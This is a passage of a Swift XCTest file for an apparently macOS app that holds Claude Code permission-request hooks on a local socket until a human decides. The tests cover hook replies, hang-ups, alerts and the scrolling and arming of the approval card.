import Network
import SwiftUI
import XCTest
@testable import Agenticious

/// A hook's `curl`, as far as the server can tell: one POST on a loopback socket, then whatever comes back.
private final class HookClient: @unchecked Sendable {
    private let connection: NWConnection
    private let queue = DispatchQueue(label: "agenticious.tests.hook-client")
    private let lock = NSLock()
    private var received = Data()
    private var isClosed = false

    init(port: UInt16, path: String, payload: [String: Any] = [:]) throws {
        let body = try JSONSerialization.data(withJSONObject: payload)
        connection = NWConnection(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: port)!, using: .tcp)
        connection.start(queue: queue)
        let head = "POST \(path) HTTP/1.1\r\nHost: 127.0.0.1:\(port)\r\nContent-Type: application/json\r\nContent-Length: \(body.count)\r\n\r\n"
        connection.send(content: Data(head.utf8) + body, completion: .contentProcessed { _ in })
        read()
    }

    private func read() {
        connection.receive(minimumIncompleteLength: 1, maximumLength: 1 << 16) { [self] data, _, isComplete, error in
            lock.withLock {
                if let data { received.append(data) }
                if isComplete || error != nil { isClosed = true }
            }
            if !isComplete, error == nil { read() }
        }
    }

    /// Like the hook process being killed: no reply was read, the socket just goes away.
    func hangUp() { connection.cancel() }

    /// The whole response once the server has closed the connection, nil while the hook is still held.
    var response: String? { lock.withLock { isClosed ? String(decoding: received, as: UTF8.self) : nil } }
    var status: String? { response?.components(separatedBy: "\r\n").first }
    var body: String? {
        guard let response, let end = response.range(of: "\r\n\r\n") else { return nil }
        return String(response[end.upperBound...])
    }
}

private struct TimedOut: Error {}

@MainActor
private func eventually(_ what: String, file: StaticString = #filePath, line: UInt = #line, _ condition: () -> Bool) async throws {
    for _ in 0..<500 {
        if condition() { return }
        try await Task.sleep(for: .milliseconds(10))
    }
    XCTFail("Timed out waiting for \(what)", file: file, line: line)
    throw TimedOut()
}

/// Lets anything already on its way arrive, before asserting that nothing did.
@MainActor
private func settle() async throws { try await Task.sleep(for: .milliseconds(150)) }

final class HookConnectionTests: XCTestCase {
    private let allow = #"{"hookSpecificOutput":{"decision":{"behavior":"allow"},"hookEventName":"PermissionRequest"}}"#

    /// What happened to the hooks a bare server received, counted from its own queue.
    private final class Log: @unchecked Sendable {
        private let lock = NSLock()
        private var hooks: [HookConnection] = [], closes = 0
        func add(_ hook: HookConnection) { lock.withLock { hooks.append(hook) } }
        func closed() { lock.withLock { closes += 1 } }
        var first: HookConnection? { lock.withLock { hooks.first } }
        var count: Int { lock.withLock { hooks.count } }
        var closeCount: Int { lock.withLock { closes } }
    }

    @MainActor
    func testAHookIsAnsweredOnceAndAHangUpIsHeardOnlyBeforeAReply() async throws {
        let log = Log()
        let server = try EventServer(port: 0) { _, hook in
            log.add(hook)
            hook.onClose { log.closed() }
        }
        server.start()
        try await eventually("a port") { (server.boundPort ?? 0) != 0 }
        let port = try XCTUnwrap(server.boundPort)
        let path = "/hook/\(UUID().uuidString)/PermissionRequest"

        let answered = try HookClient(port: port, path: path)
        try await eventually("the request") { log.first != nil }
        try await settle()
        XCTAssertNil(answered.response, "held until someone replies")
        let hook = try XCTUnwrap(log.first)
        hook.reply(Data(allow.utf8))
        hook.reply(Data(#"{"second":true}"#.utf8))
        hook.reply(nil)
        try await eventually("the reply") { answered.response != nil }
        XCTAssertEqual(answered.status, "HTTP/1.1 200 OK")
        XCTAssertEqual(answered.body, allow, "the first reply, whole, and nothing after it")
        try await settle()
        XCTAssertEqual(log.closeCount, 0, "closing after a reply is not a hang-up")

        let killed = try HookClient(port: port, path: path)
        try await eventually("the second request") { log.count == 2 }
        killed.hangUp()
        try await eventually("the hang-up") { log.closeCount == 1 }
        try await settle()
        XCTAssertEqual(log.closeCount, 1, "heard once")
    }

    /// The path a real hook takes: the server's socket, the store's routing, the held queue, a click, the reply.
    @MainActor
    func testAPermissionRequestIsHeldOverTheSocketUntilTheHumanDecidesOrClaudeMovesOn() async throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: folder) }
        let url = folder.appendingPathComponent("test.sqlite")
        let saved = AgentSession(task: "Tidy the build", agent: .claude, project: .none, directory: folder)
        try SessionDatabase(url: url).save(saved)
        let store = SessionStore(databaseURL: url, port: 0)
        // A request alerts, and outside the app an alert is a sound.
        let sounds = store.notifications.soundsEnabled
        store.notifications.soundsEnabled = false
        defer { store.notifications.soundsEnabled = sounds }
        let session = try XCTUnwrap(store.session(saved.id))
        session.isRunning = true
        session.status = .working
        try await eventually("a port") { (store.listeningPort ?? 0) != 0 }
        let port = try XCTUnwrap(store.listeningPort)
        func post(_ event: String, _ payload: [String: Any], to other: UUID? = nil) throws -> HookClient {
            try HookClient(port: port, path: "/hook/\((other ?? session.id).uuidString)/\(event)", payload: payload)
        }

        // Request in, held, shown; a click on Allow sends exactly the allow.
        let allowed = try post("PermissionRequest", PermissionFixture.script)
        try await eventually("the card") { session.pendingPermissions.count == 1 }
        try await settle()
        XCTAssertNil(allowed.response, "nothing is sent while the card waits")
        XCTAssertEqual(session.presentedStatus, .permissionRequired("Run command · python3 -c \"print(11)\""))
        XCTAssertEqual(store.attentionCount, 1)
        XCTAssertEqual(store.workingCount, 0)
        let id = try XCTUnwrap(session.pendingPermissions.first?.id)
        store.decide(.allow, on: id, in: session)
        try await eventually("the allow") { allowed.response != nil }
        XCTAssertEqual(allowed.status, "HTTP/1.1 200 OK")
        XCTAssertEqual(allowed.body, allow)
        XCTAssertEqual(session.presentedStatus, .working)
        XCTAssertEqual(store.attentionCount, 0)
        store.decide(.deny(note: ""), on: id, in: session)
        XCTAssertEqual(session.status, .working, "a second click finds nothing to answer")

        // Claude moved on (the human said Yes in the terminal and the tool ran): an empty reply, never a decision.
        let call: [String: Any] = ["tool_name": "Bash", "tool_input": PermissionFixture.touch["tool_input"]!, "tool_use_id": "t1"]
        _ = try post("PreToolUse", call)
        try await eventually("the tool call") { session.openToolCalls.count == 1 }
        let released = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the second card") { session.pendingPermissions.count == 1 }
        XCTAssertEqual(session.pendingPermissions.first?.request.toolUseID, "t1")
        let stale = try XCTUnwrap(session.pendingPermissions.first?.id)
        _ = try post("PostToolUse", call)
        try await eventually("the release") { released.response != nil }
        XCTAssertEqual(released.status, "HTTP/1.1 204 No Content")
        XCTAssertEqual(released.body, "")
        XCTAssertTrue(session.pendingPermissions.isEmpty)
        store.decide(.allowAlways, on: stale, in: session)
        XCTAssertEqual(session.presentedStatus, .working, "the click that was on its way does nothing")

        // "Answer in terminal instead" is the same empty reply, with the terminal named as the place to go.
        let handed = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the third card") { session.pendingPermissions.count == 1 }
        store.answerInTerminal(session.pendingPermissions.map(\.id), in: session)
        try await eventually("the hand-over") { handed.response != nil }
        XCTAssertEqual(handed.status, "HTTP/1.1 204 No Content")
        XCTAssertEqual(session.status, .permissionRequired("Run command · touch build/ready · answer in the terminal"))
        XCTAssertEqual(store.attentionCount, 1)
        // Answered there with a No and a note, Claude replies in text: its turn ending is the next thing heard.
        let stopped = try post("Stop", ["stop_hook_active": true])
        try await eventually("the turn's end") { stopped.response != nil }
        XCTAssertEqual(session.status, .yourTurn)
        XCTAssertFalse(session.isAwaitingPermission)
        XCTAssertEqual(store.attentionCount, 0)

        // The hook process dies (No or Esc in the terminal, or its timeout): the card goes, the reply box stays shut.
        session.isAwaitingPermission = false
        session.status = .working
        let killed = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the fourth card") { session.pendingPermissions.count == 1 }
        killed.hangUp()
        try await eventually("the hang-up") { session.pendingPermissions.isEmpty }
        XCTAssertEqual(session.status, .needsYou("The permission prompt closed in the terminal (Run command · touch build/ready). Continue there."))
        XCTAssertTrue(session.isAwaitingPermission)

        // What the card can't answer is never held: a plan review, a stopped agent, an agent this app doesn't know.
        session.isAwaitingPermission = false
        session.status = .working
        let plan = try post("PermissionRequest", ["tool_name": "ExitPlanMode", "tool_input": ["plan": "Do it"]])
        try await eventually("the pass-through") { plan.response != nil }
        XCTAssertEqual(plan.status, "HTTP/1.1 204 No Content")
        let unknown = try post("PermissionRequest", PermissionFixture.touch, to: UUID())
        try await eventually("the unknown agent's reply") { unknown.response != nil }
        XCTAssertEqual(unknown.status, "HTTP/1.1 204 No Content")
        session.isRunning = false
        let idle = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the stopped agent's reply") { idle.response != nil }
        XCTAssertEqual(idle.status, "HTTP/1.1 204 No Content")
        XCTAssertTrue(session.pendingPermissions.isEmpty)
        XCTAssertEqual(session.presentedStatus, .working)

        // Pausing or archiving with a card up hands it back too.
        session.isRunning = true
        let paused = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the card to pause under") { session.pendingPermissions.count == 1 }
        store.pause(session)
        XCTAssertTrue(session.pendingPermissions.isEmpty)
        XCTAssertEqual(session.status, .paused)
        try await eventually("the pause's release") { paused.response != nil }
        XCTAssertEqual(paused.status, "HTTP/1.1 204 No Content")

        session.isRunning = true
        session.status = .working
        let archived = try post("PermissionRequest", PermissionFixture.touch)
        try await eventually("the card to archive under") { session.pendingPermissions.count == 1 }
        store.archive(session)
        // Asserted before cleanup can finish: its own exit would release the card too, and hide a regression.
        XCTAssertTrue(session.isArchiving, "cleanup has only started")
        XCTAssertTrue(session.pendingPermissions.isEmpty, "no card with live buttons while cleanup runs")
        try await eventually("the archive's release") { archived.response != nil }
        XCTAssertEqual(archived.status, "HTTP/1.1 204 No Content")
        try await eventually("the archive") { !session.isArchiving }
    }

    /// A store on a free port with one running agent, and every alert it raises.
    @MainActor
    private final class Bench {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let store: SessionStore
        let sessions: [AgentSession]
        private(set) var alerts: [AgentAlert] = []
        private let sounds: Bool
        var session: AgentSession { sessions[0] }

        /// Agents are saved oldest first, and all run.
        init(agents: Int = 1) throws {
            let folder = folder, url = folder.appendingPathComponent("test.sqlite")
            let saved = (0..<agents).map {
                AgentSession(task: "Tidy the build", agent: .claude, project: .none, directory: folder, startedAt: Date(timeIntervalSince1970: Double($0 + 1)))
            }
            let database = try SessionDatabase(url: url)
            try saved.forEach { try database.save($0) }
            let store = SessionStore(databaseURL: url, port: 0)
            let sessions = try saved.map { try XCTUnwrap(store.session($0.id)) }
            (self.store, self.sessions) = (store, sessions)
            // Outside the app an alert is a sound.
            sounds = store.notifications.soundsEnabled
            store.notifications.soundsEnabled = false
            store.notifications.onAlert = { [weak self] alert, _ in self?.alerts.append(alert) }
            for session in sessions {
                session.isRunning = true
                session.status = .working
            }
        }

        func forgetAlerts() { alerts = [] }

        func close() {
            store.notifications.soundsEnabled = sounds
            try? FileManager.default.removeItem(at: folder)
        }

        func post(_ event: String, _ payload: [String: Any]) async throws -> HookClient {
            try await eventually("a port") { (store.listeningPort ?? 0) != 0 }
            return try HookClient(port: try XCTUnwrap(store.listeningPort), path: "/hook/\(session.id.uuidString)/\(event)", payload: payload)
        }
    }

    private let notice: [String: Any] = ["notification_type": "permission_prompt", "message": "Claude needs your permission"]

    /// A subagent stopped with its menu up sends no hook. Once Claude has logged the call's result, the main agent's
    /// next hook takes the menu off the list, and its turn ending opens the reply box again.
    @MainActor
    func testAHandedOverMenuWhoseResultIsLoggedIsDroppedOnTheMainAgentsNextHook() async throws {
        let bench = try Bench()
        defer { bench.close() }
        let session = bench.session
        session.terminalView = AgentTerminalView(frame: .zero)
        let conversation = bench.folder.appendingPathComponent("conversation.jsonl")
        session.transcriptURL = conversation
        let log = SubagentCatalog.transcript(of: "a1", conversation: conversation)
        try FileManager.default.createDirectory(at: log.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data().write(to: log)

        let call: [String: Any] = ["tool_name": "Bash", "tool_input": PermissionFixture.touch["tool_input"]!, "tool_use_id": "s1", "agent_id": "a1"]
        _ = try await bench.post("PreToolUse", call)
        try await eventually("the call") { session.openToolCalls.count == 1 }
        _ = try await bench.post("PermissionRequest", PermissionFixture.subagentTouch)
        try await eventually("the card") { session.pendingPermissions.count == 1 }
        bench.store.answerInTerminal(session.pendingPermissions.map(\.id), in: session)
        XCTAssertEqual(session.terminalMenus.count, 1)

        let first = try await bench.post("UserPromptSubmit", [:])
        try await eventually("the prompt") { first.response != nil }
        try await settle()
        XCTAssertEqual(session.terminalMenus.count, 1, "nothing logged yet: the menu may still be up")

        try (#"{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"s1","content":"Interrupted","is_error":true}]}}"# + "\n")
            .write(to: log, atomically: true, encoding: .utf8)
        let second = try await bench.post("UserPromptSubmit", [:])
        try await eventually("the logged result to be read") { session.terminalMenus.isEmpty }
        try await eventually("the prompt") { second.response != nil }
        let stopped = try await bench.post("Stop", ["stop_hook_active": true, "background_tasks": [[String: Any]]()])
        try await eventually("the turn's end") { stopped.response != nil }
        XCTAssertEqual(session.status, .yourTurn)
        XCTAssertTrue(session.canReplyInline)
    }

    /// A held request is what the human sees, so it is what alerts and what sorts, whatever the hooks' own status says.
    @MainActor
    func testAHeldRequestAlertsOnceAndFloatsItsAgentToTheTop() async throws {
        let bench = try Bench(agents: 2)
        defer { bench.close() }
        let store = bench.store, session = bench.session
        func queue() -> [UUID] { store.projectGroups.flatMap(\.sessions).map(\.id) }
        XCTAssertEqual(queue(), [bench.sessions[1].id, session.id], "newest first while nothing waits")

        // A background subagent's request: no other hook says anyone is waiting.
        let held = try await bench.post("PermissionRequest", PermissionFixture.subagentTouch)
        try await eventually("the card") { session.pendingPermissions.count == 1 }
        XCTAssertEqual(session.status, .working)
        XCTAssertEqual(bench.alerts, [.permissionRequired])
        XCTAssertEqual(queue(), [session.id, bench.sessions[1].id])

        // Claude's own notice, six seconds later, is the same wait, and so is the hand-over.
        _ = try await bench.post("Notification", notice)
        try await eventually("the notice") { session.status != .working }
        store.answerInTerminal(session.pendingPermissions.map(\.id), in: session)
        try await eventually("the hand-over") { held.response != nil }
        XCTAssertEqual(bench.alerts, [.permissionRequired])
    }

    /// The main agent's menu is already under the human's hands in its terminal: a prompt answered there stays
    /// silent, and one left alone alerts when Claude itself says it is still waiting.
    @MainActor
    func testAPromptAtTheHumansTerminalAlertsOnlyIfLeftUnanswered() async throws {
        let bench = try Bench()
        defer { bench.close() }
        let store = bench.store, session = bench.session
        let terminal = AgentTerminalView(frame: .zero)
        session.terminalView = terminal
        func call(_ number: Int) -> [String: Any] {
            ["tool_name": "Bash", "tool_input": PermissionFixture.touch["tool_input"]!, "tool_use_id": "t\(number)"]
        }
        func card(_ payload: [String: Any] = PermissionFixture.touch) async throws {
            _ = try await bench.post("PermissionRequest", payload)
            try await eventually("the card") { session.pendingPermissions.count == 1 }
        }

        // Away from the terminal (no application object here, so the real check says "away"): at once.
        try await card()
        XCTAssertEqual(bench.alerts, [.permissionRequired])
        store.decide(.allow, on: session.pendingPermissions[0].id, in: session)

        // At the terminal: a run of prompts, each answered by a key and then run, raises nothing.
        store.isAtTerminal = { $0 === session }
        bench.forgetAlerts()
        for number in 1...4 {
            _ = try await bench.post("PreToolUse", call(number))
            try await eventually("the call") { session.openToolCalls.count == 1 }
            try await card()
            XCTAssertEqual(session.presentedStatus, .permissionRequired("Run command · touch build/ready"), "shown, only not announced")
            store.typed(in: terminal, modifiers: [])
            XCTAssertEqual(session.presentedStatus, .working)
            _ = try await bench.post("PostToolUse", call(number))
            try await settle()
        }
        XCTAssertEqual(bench.alerts, [])

        // Left unanswered: Claude's notice alerts once, with the card still up and untouched.
        try await card()
        XCTAssertEqual(bench.alerts, [])
        _ = try await bench.post("Notification", notice)
        try await eventually("the alert") { bench.alerts.count == 1 }
        _ = try await bench.post("Notification", notice)
        try await settle()
        XCTAssertEqual(bench.alerts, [.permissionRequired])
        XCTAssertEqual(session.pendingPermissions.count, 1)
        store.decide(.allow, on: session.pendingPermissions[0].id, in: session)
        XCTAssertEqual(session.presentedStatus, .working)

        // A key that did not answer: the card is gone, and the notice still alerts.
        bench.forgetAlerts()
        try await card()
        store.typed(in: terminal, modifiers: [])
        XCTAssertEqual(bench.alerts, [])
        _ = try await bench.post("Notification", notice)
        try await eventually("the alert") { bench.alerts.count == 1 }
        XCTAssertEqual(bench.alerts, [.permissionRequired])
        _ = try await bench.post("PostToolUse", call(9))
        try await eventually("the tool's result") { session.status == .working }

        // A quiet wait that ended is forgotten: a later, unrelated notice alerts as itself.
        bench.forgetAlerts()
        try await card()
        store.decide(.allow, on: session.pendingPermissions[0].id, in: session)
        _ = try await bench.post("Notification", ["notification_type": "idle_prompt", "message": "Claude is waiting for your input"])
        try await eventually("the idle notice") { session.status == .yourTurn }
        XCTAssertEqual(bench.alerts, [.yourTurn])

        // A subagent's request alerts at once even there: its menu is not in the terminal, and nothing else announces it.
        session.status = .working
        bench.forgetAlerts()
        try await card(PermissionFixture.subagentTouch)
        XCTAssertEqual(bench.alerts, [.permissionRequired])

        // Nor does a quiet main-agent card in front of it keep it silent; Claude's notice then adds nothing.
        session.releaseHeldRequests()
        session.status = .working
        bench.forgetAlerts()
        try await card()
        XCTAssertEqual(bench.alerts, [])
        _ = try await bench.post("PermissionRequest", PermissionFixture.subagentTouch)
        try await eventually("the subagent's card") { session.pendingPermissions.count == 2 }
        XCTAssertEqual(bench.alerts, [.permissionRequired])
        _ = try await bench.post("Notification", notice)
        try await eventually("the notice") { session.status != .working }
        try await settle()
        XCTAssertEqual(bench.alerts, [.permissionRequired])
    }

    /// Typing where Claude's own menu shows takes the main agent's cards away, and is never a decision.
    @MainActor
    func testAKeyTypedInTheAgentsTerminalHandsItsCardsToClaudesMenu() throws {
        let bench = try Bench()
        defer { bench.close() }
        let store = bench.store, session = bench.session
        let terminal = AgentTerminalView(frame: .zero)
        session.terminalView = terminal
        var replies: [String: Data?] = [:]
        PermissionInterpreter.hold(PermissionFixture.touch, in: session) { replies["main"] = $0 }
        PermissionInterpreter.hold(PermissionFixture.subagentTouch, in: session) { replies["subagent"] = $0 }

        store.typed(in: terminal, modifiers: [.command])
        store.typed(in: NSTextView(), modifiers: [])
        store.typed(in: AgentTerminalView(frame: .zero), modifiers: [])
        store.typed(in: nil, modifiers: [])
        XCTAssertEqual(session.pendingPermissions.count, 2, "a shortcut, another field, another agent's terminal")
        XCTAssertTrue(replies.isEmpty)

        store.typed(in: terminal, modifiers: [.shift])
        XCTAssertEqual(replies.keys.sorted(), ["main"], "the subagent's menu is not in the terminal while its card is held")
        XCTAssertEqual(replies["main"], .some(nil), "an empty reply, never a decision")
        XCTAssertEqual(session.pendingPermissions.map(\.request.isFromSubagent), [true])
        XCTAssertEqual(session.status, .working, "whether the key answered is for Claude's own hooks to say")
        XCTAssertEqual(store.attentionCount, 1, "the subagent's card still waits")
        store.typed(in: terminal, modifiers: [])
        XCTAssertEqual(session.pendingPermissions.count, 1)
    }

    /// The hook as Claude Code runs it: the launcher's own command line, fed the payload, its output read back.
    @MainActor
    func testTheHooksOwnCurlCommandPrintsTheDecisionAndNothingForARelease() async throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: folder) }
        let url = folder.appendingPathComponent("test.sqlite")
        let saved = AgentSession(task: "Tidy the build", agent: .claude, project: .none, directory: folder)
        try SessionDatabase(url: url).save(saved)
        let store = SessionStore(databaseURL: url, port: 0)
        let sounds = store.notifications.soundsEnabled
        store.notifications.soundsEnabled = false
        defer { store.notifications.soundsEnabled = sounds }
        let session = try XCTUnwrap(store.session(saved.id))
        session.isRunning = true
        session.status = .working
        try await eventually("a port") { (store.listeningPort ?? 0) != 0 }

        _ = try AgentLauncher(port: try XCTUnwrap(store.listeningPort), supportDirectory: folder).spec(for: session)
        let file = folder.appendingPathComponent("Agenticious/sessions/\(session.id.uuidString)/settings.json")
        let settings = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: Any])
        let entry = try XCTUnwrap(((settings["hooks"] as? [String: Any])?["PermissionRequest"] as? [[String: Any]])?.first)
        let command = try XCTUnwrap((entry["hooks"] as? [[String: Any]])?.first?["command"] as? String)

        var started: [Process] = []
        defer { started.filter(\.isRunning).forEach { $0.terminate() } }
        func hook(_ payload: [String: Any]) throws -> (process: Process, output: Pipe) {
            let process = Process(), input = Pipe(), output = Pipe()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = ["-c", command]
            process.standardInput = input
            process.standardOutput = output
            try process.run()
            started.append(process)
            input.fileHandleForWriting.write(try JSONSerialization.data(withJSONObject: payload))
            try input.fileHandleForWriting.close()
            return (process, output)
        }
        func printed(_ hook: (process: Process, output: Pipe)) -> String {
            String(decoding: hook.output.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        }

        let denied = try hook(PermissionFixture.touch)
        try await eventually("the card") { session.pendingPermissions.count == 1 }
        XCTAssertTrue(denied.process.isRunning, "the hook waits for as long as the card does")
        store.decide(.deny(note: "use make ready"), on: try XCTUnwrap(session.pendingPermissions.first?.id), in: session)
        try await eventually("the hook to exit") { !denied.process.isRunning }
        XCTAssertEqual(denied.process.terminationStatus, 0)
        XCTAssertEqual(printed(denied), #"{"hookSpecificOutput":{"decision":{"behavior":"deny","message":"The user doesn't want to proceed with this tool use. "#
                       + #"The tool use was rejected. To tell you how to proceed, the user said:\nuse make ready"},"hookEventName":"PermissionRequest"}}"#)

        let released = try hook(PermissionFixture.touch)
        try await eventually("the second card") { session.pendingPermissions.count == 1 }
        store.answerInTerminal(session.pendingPermissions.map(\.id), in: session)
        try await eventually("the released hook to exit") { !released.process.isRunning }
        XCTAssertEqual(released.process.terminationStatus, 0)
        XCTAssertEqual(printed(released), "", "no output is no decision: Claude's own menu stays in charge")

        // An app that isn't there is the same empty answer, at once.
        let nobody = Process(), silence = Pipe()
        nobody.executableURL = URL(fileURLWithPath: "/bin/sh")
        nobody.arguments = ["-c", command.replacingOccurrences(of: ":\(store.listeningPort ?? 0)/", with: ":1/")]
        nobody.standardInput = FileHandle.nullDevice
        nobody.standardOutput = silence
        try nobody.run()
        started.append(nobody)
        try await eventually("the unreachable hook to exit") { !nobody.isRunning }
        XCTAssertEqual(nobody.terminationStatus, 0, "a failed hook must not look like an error to Claude")
        XCTAssertEqual(String(decoding: silence.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self), "")
    }

    // MARK: - The card, drawn off screen and never in a window

    /// The real Activity pane at a fixed size, with what the card says about its Allow button.
    @MainActor
    private final class Pane {
        let host: NSHostingView<AnyView>
        let session: AgentSession
        private(set) var canAllow = false

        init(_ request: [String: Any], store: SessionStore, height: CGFloat, width: CGFloat = 760, scale: CGFloat = 1,
             question: Bool = false, settling: TimeInterval = 1) {
            let session = AgentSession(task: "Tidy the build", agent: .claude, project: .none, directory: URL(fileURLWithPath: "/code/app"))
            self.session = session
            session.isRunning = true
            session.status = .working
            if question {
                let options = ["Debug", "Release", "Both"].map { AgentQuestion.Option(label: $0, detail: "Builds the \($0.lowercased()) target") }
                session.pendingQuestion = PendingQuestion(toolUseID: "q1", questions: [
                    AgentQuestion(header: "Target", text: "Which target should be built first?", options: options, allowsMultiple: false),
                ], input: [:], respond: { _ in })
            }
            PermissionInterpreter.hold(request, in: session, respond: { _ in })
            host = NSHostingView(rootView: AnyView(EmptyView()))
            host.rootView = AnyView(ActivityView(session: session, openTerminal: {})
                .onPreferenceChange(PermissionCard.CanAllow.self) { [weak self] in self?.canAllow = $0 }
                .frame(width: width, height: height).environmentObject(store).environment(\.textScale, scale))
            host.frame = CGRect(x: 0, y: 0, width: width, height: height)
            wait(settling)
        }

        /// Long enough for the card to arm, and for a scroll to be laid out.
        func wait(_ seconds: TimeInterval) {
            host.layoutSubtreeIfNeeded()
            RunLoop.main.run(until: Date().addingTimeInterval(seconds))
            host.layoutSubtreeIfNeeded()
        }

        private func descendants(_ view: NSView) -> [NSView] { view.subviews.flatMap { [$0] + descendants($0) } }
        private func frame(_ view: NSView) -> CGRect { host.convert(view.bounds, from: view) }

        /// The card's own scroller is the topmost in the pane; the activity list's is below it.
        var scroller: NSScrollView {
            descendants(host).compactMap { $0 as? NSScrollView }.min { frame($0).minY < frame($1).minY }!
        }
        /// The note field, which sits with Deny and Allow.
        var note: NSTextField { descendants(host).compactMap { $0 as? NSTextField }.first(where: \.isEditable)! }
        var noteScrolls: Bool { sequence(first: note as NSView, next: \.superview).contains { $0 === scroller } }
        /// How much of the note field is on screen.
        var noteInView: CGRect { frame(note).intersection(noteScrolls ? frame(scroller) : host.bounds) }
        var requestHeight: CGFloat { frame(scroller).height }

        /// Moves the card's content up by this much, as dragging its scroll bar would. No event is posted.
        func scroll(to offset: CGFloat) {
            let clip = scroller.contentView
            clip.scroll(to: NSPoint(x: 0, y: offset))
            scroller.reflectScrolledClipView(clip)
            wait(0.3)
        }

        /// Scrolls on a screenful at a time until Allow answers, and says how far that was. Nil if it never does.
        func scrollUntilAllowed() -> CGFloat? {
            let page = requestHeight - 20
            return (1...40).map { CGFloat($0) * page }.first { scroll(to: $0); return canAllow }
        }

        /// In a card that scrolls whole: brings the note field, and so the buttons under it, to the top of the card.
        func scrollToButtons() { scroll(to: scroller.contentView.bounds.minY + frame(note).minY - frame(scroller).minY) }

        /// Every offset from the top to past the end, a step at a time: whether Allow ever answered on the way.
        func allowsAnywhere(step: CGFloat = 40) -> Bool {
            let end = (scroller.documentView?.frame.height ?? 0) + 100
            return stride(from: CGFloat(0), through: end, by: step).contains { scroll(to: $0); return canAllow }
        }

        func snapshot(_ name: String) throws {
            guard let folder = ProcessInfo.processInfo.environment["PERMISSION_CARD_SNAPSHOT_DIRECTORY"] else { return }
            let bitmap = try XCTUnwrap(host.bitmapImageRepForCachingDisplay(in: host.bounds))
            host.cacheDisplay(in: host.bounds, to: bitmap)
            try bitmap.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: folder).appendingPathComponent("permission-card-\(name).png"))
        }
    }

    private func command(_ text: String, suggestions: [[String: Any]]? = nil) -> [String: Any] {
        var payload: [String: Any] = ["tool_name": "Bash", "tool_input": ["command": text, "description": "Build every target in order"], "cwd": "/code/app"]
        payload["permission_suggestions"] = suggestions
        return payload
    }
    private let rule: [String: Any] = ["type": "addRules", "rules": [["toolName": "Bash", "ruleContent": "make:*"]], "behavior": "allow", "destination": "session"]
    private let manyLines = (1...120).map { "echo step \($0) && make target-\($0)" }.joined(separator: "\n")

    @MainActor
    private func layoutStore() -> (SessionStore, URL) {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        return (SessionStore(databaseURL: folder.appendingPathComponent("test.sqlite"), port: 0), folder)
    }

    /// With room, only the request scrolls and the buttons stay put. A short request needs no scrolling at all, and
    /// Allow answers once the card has armed, as it always did.
    @MainActor
    func testWithRoomTheButtonsStayPinnedUnderAScrollingRequest() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        for scale in [1, 1.5] as [CGFloat] {
            let short = Pane(command("touch build/ready", suggestions: [rule]), store: store, height: 900, scale: scale)
            XCTAssertFalse(short.noteScrolls, "scale \(scale)")
            XCTAssertEqual(short.noteInView, short.host.convert(short.note.bounds, from: short.note), "scale \(scale): the footer is whole")
            XCTAssertTrue(short.canAllow, "scale \(scale): all of it is on screen, so nothing more to wait for than the arming delay")
            try short.snapshot("short-\(Int(scale * 100))")

            let long = Pane(command(manyLines, suggestions: [rule]), store: store, height: 900, scale: scale)
            XCTAssertFalse(long.noteScrolls, "scale \(scale): the buttons are pinned")
            XCTAssertEqual(long.noteInView, long.host.convert(long.note.bounds, from: long.note), "scale \(scale): and on the card")
            XCTAssertGreaterThan(long.requestHeight, 200 * scale, "scale \(scale): the request keeps room to be read")
            XCTAssertLessThan(long.host.convert(long.note.bounds, from: long.note).maxY, 80 + 460 * scale, "scale \(scale): the card keeps to its limit")
            XCTAssertFalse(long.canAllow, "scale \(scale): the end of the request has not been on screen")
            try long.snapshot("long-\(Int(scale * 100))")
            // 120 lines of a 12-point font: the end is several screenfuls down, and not before.
            XCTAssertGreaterThan(try XCTUnwrap(long.scrollUntilAllowed(), "scale \(scale)"), 1_200 * scale, "scale \(scale)")
            long.scroll(to: 0)
            XCTAssertTrue(long.canAllow, "scale \(scale): seen once is seen")

            // What Claude's own menu would warn about is said with the buttons, not in the part that scrolls away.
            var flagged = command(manyLines, suggestions: [])
            flagged["tool_input"] = ["command": manyLines, "dangerouslyDisableSandbox": true]
            let warned = Pane(flagged, store: store, height: 900, scale: scale)
            XCTAssertFalse(warned.noteScrolls)
            XCTAssertEqual(warned.noteInView, warned.host.convert(warned.note.bounds, from: warned.note), "scale \(scale)")
            XCTAssertLessThan(warned.requestHeight, long.requestHeight - 50 * scale, "scale \(scale): the two warnings take their room from the request")
            try warned.snapshot("warned-\(Int(scale * 100))")
        }
        // An ordinary short request arms with no scrolling at every text size and at the widths a sidebar leaves: the
        // footer never takes height from the request's scroller, which would leave its end a few points out of view.
        var panes: [(String, Pane)] = []
        for scale in [1, 1.2, 1.3, 1.4, 1.5] as [CGFloat] {
            for width in [460, 500, 540, 580, 620, 760] as [CGFloat] {
                for suggestions in [[rule], nil] {
                    panes.append(("scale \(scale) width \(width) rule \(suggestions != nil)",
                                  Pane(command("touch build/ready", suggestions: suggestions), store: store, height: 1_000, width: width, scale: scale, settling: 0)))
                }
            }
        }
        panes.first?.1.wait(1)
        for (name, pane) in panes {
            pane.wait(0)
            XCTAssertFalse(pane.noteScrolls, name)
            XCTAssertTrue(pane.canAllow, name)
        }

        // The least room that still pins the buttons: below it the request would be squeezed, so the card scrolls whole.
        let snug = Pane(command(manyLines), store: store, height: 440)
        XCTAssertFalse(snug.noteScrolls)
        XCTAssertEqual(snug.noteInView, snug.host.convert(snug.note.bounds, from: snug.note))
